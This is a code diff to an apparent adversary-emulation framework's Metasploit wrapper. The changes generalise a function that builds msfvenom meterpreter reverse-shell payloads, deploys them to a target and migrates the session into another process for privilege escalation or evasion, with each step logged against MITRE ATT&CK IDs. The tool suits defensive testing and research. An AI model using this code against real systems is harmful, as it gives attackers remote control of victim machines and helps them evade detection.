@@ -197,34 +197,30 @@ class Metasploit():
 
         return res
 
-    def smart_infect(self, target, payload_type="windows/x64/meterpreter/reverse_https", payload_name="babymetal.exe"):
+    def smart_infect(self, target, **kwargs):
         """ Checks if a target already has a meterpreter session open. Will deploy a payload if not """
 
         # TODO Smart_infect should detect the platform of the target and pick the proper parameters based on that
 
+        payload_name = kwargs.get("outfile", "babymetal.exe")
+        payload_type = kwargs.get("payload", None)
+        if payload_type is None:
+            raise MetasploitError("Payload not defined")
         try:
-            self.start_exploit_stub_for_external_payload(payload=payload_type)
+            self.start_exploit_stub_for_external_payload(payload_type, lhost=kwargs.get("lhost", None))
             self.wait_for_session(2)
         except MetasploitError:
 
             self.attack_logger.vprint(
-                f"{CommandlineColors.OKCYAN}Create payload {payload_name} replacement{CommandlineColors.ENDC}",
+                f"{CommandlineColors.OKCYAN}Create payload {payload_name} {CommandlineColors.ENDC}",
                 1)
             venom = MSFVenom(self.attacker, target, self.attack_logger)
-            venom.generate_and_deploy(payload=payload_type,
-                                      architecture="x86",
-                                      platform="windows",
-                                      lhost=self.attacker.get_ip(),
-                                      format="exe",
-                                      outfile=payload_name,
-                                      encoder="x86/shikata_ga_nai",
-                                      iterations=5
-                                      )
+            venom.generate_and_deploy(**kwargs)
             self.attack_logger.vprint(
-                f"{CommandlineColors.OKCYAN}Execute {payload_name} replacement - waiting for meterpreter shell{CommandlineColors.ENDC}",
+                f"{CommandlineColors.OKCYAN}Execute {payload_name} - waiting for meterpreter shell{CommandlineColors.ENDC}",
                 1)
 
-            self.start_exploit_stub_for_external_payload(payload=payload_type)
+            self.start_exploit_stub_for_external_payload(payload=payload_type, lhost=kwargs.get("lhost", None))
             self.wait_for_session()
 
 ##########################################################################
@@ -301,7 +297,7 @@ class MSFVenom():
 
         # Footnote: Currently we only support windows/linux and the "boring" payloads. This will be more tricky as soon as we get creative here
 
-        print(cmd)
+        print(f"MSFVenom: {cmd}")
         self.attacker.remote_run(cmd)
 
     def generate_and_deploy(self, **kwargs):
@@ -451,6 +447,9 @@ class MetasploitInstant(Metasploit):
         """
 
         ttp = "T1055"
+        tactics = "Privilege Escalation"
+        tactics_id = "TA0004"
+        description = "Migrating to another process can escalate privileges, move the meterpreter to a long running process or evade detection. For that the Meterpreter stub is injected into another process and the new stub then connects to the Metasploit server instead of the old one."
 
         process_list = self.ps_process_discovery(target)
         ps = self.parse_ps(process_list[0])
@@ -464,17 +463,22 @@ class MetasploitInstant(Metasploit):
         target_process = random.choice(filtered_list)
         print(f"Migrating to process {target_process}")
         command = f"migrate {target_process['PID']}"
-        self.attack_logger.start_metasploit_attack(source=self.attacker.get_ip(),
-                                                   target=target.get_ip(),
-                                                   metasploit_command=command,
-                                                   ttp=ttp)
+        logid = self.attack_logger.start_metasploit_attack(source=self.attacker.get_ip(),
+                                                           target=target.get_ip(),
+                                                           metasploit_command=command,
+                                                           name="migrate",
+                                                           description=description,
+                                                           tactics=tactics,
+                                                           tactics_id=tactics_id,
+                                                           ttp=ttp)
         res = self.meterpreter_execute_on([command], target)
-        print(res)
+        print(f"Result of migrate {res}")
         self.attack_logger.stop_metasploit_attack(source=self.attacker.get_ip(),
                                                   target=target.get_ip(),
                                                   metasploit_command=command,
                                                   ttp=ttp,
-                                                  result=res)
+                                                  result=res,
+                                                  logid=logid)
         return res
 
     def arp_network_discovery(self, target, **kwargs):
